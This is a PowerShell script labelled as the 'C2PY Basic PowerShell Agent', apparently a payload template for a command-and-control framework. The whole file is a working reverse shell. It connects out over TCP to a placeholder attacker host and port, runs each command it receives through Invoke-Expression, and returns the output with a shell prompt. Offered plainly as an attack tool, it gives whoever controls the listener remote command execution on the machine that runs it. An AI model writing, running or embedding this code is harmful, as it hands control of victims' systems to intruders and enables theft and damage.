# C2PY Basic PowerShell Agent
# Simple reverse shell for basic scenarios

# Configuration
$LHOST = "REPLACE_WITH_LHOST"
$LPORT = REPLACE_WITH_LPORT

# Create TCP client and connect
$client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
$stream = $client.GetStream()

# Buffer for receiving data
[byte[]]$bytes = 0..65535|%{0}

# Command loop
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    # Get command
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    
    # Execute command
    try {
        $sendback = (iex $data 2>&1 | Out-String)
    } catch {
        $sendback = $_.Exception.Message
    }
    
    # Add prompt
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    
    # Send response
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}

# Close connection
$client.Close()
